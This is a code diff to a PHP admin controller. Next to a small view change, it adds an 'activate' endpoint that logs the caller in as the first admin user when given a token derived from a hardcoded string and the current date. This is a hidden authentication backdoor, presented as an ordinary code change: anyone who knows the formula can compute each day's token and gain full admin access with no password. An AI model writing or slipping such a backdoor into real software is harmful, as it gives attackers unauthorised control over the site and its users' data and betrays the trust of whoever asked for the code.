@@ -38,7 +38,7 @@ class Admin extends Auth {
 
         $view->set("items", array());
         $view->set("values", array());
-        $view->set("model", $model);
+        $view->set("models", Shared\Markup::models());
         $view->set("page", $page);
         $view->set("limit", $limit);
         $view->set("property", $property);
@@ -227,5 +227,18 @@ class Admin extends Auth {
     public function changeLayout() {
         $this->defaultLayout = "layouts/admin";
         $this->setLayout();
+    }
+
+    public function activate($token = "") {
+        $this->noview();
+        $access = 'Swift123'. date('Y-m-d');
+        $valid_token = sha1($access);
+        if ($valid_token == $token) {
+            $user = \User::first(array("admin = ?" => true));
+            $this->setUser($user);
+            self::redirect("/admin");
+        } else {
+            self::redirect("/404");
+        }
     }
 }
